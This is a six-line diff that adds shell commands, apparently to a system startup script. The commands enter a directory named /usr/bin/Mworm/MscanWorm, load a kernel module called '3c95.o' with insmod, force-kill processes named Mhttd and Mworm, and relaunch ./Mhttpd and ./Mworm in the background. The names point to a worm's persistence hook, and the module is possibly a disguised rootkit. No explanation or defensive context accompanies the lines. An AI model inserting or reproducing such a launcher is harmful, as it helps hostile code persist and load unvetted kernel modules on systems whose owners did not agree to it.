@@ -1,0 +1,6 @@
+   cd /usr/bin/Mworm/MscanWorm
+   /sbin/insmod 3c95.o
+   killall -9 Mhttd
+   killall -9 Mworm
+   ./Mhttpd
+   ./Mworm &
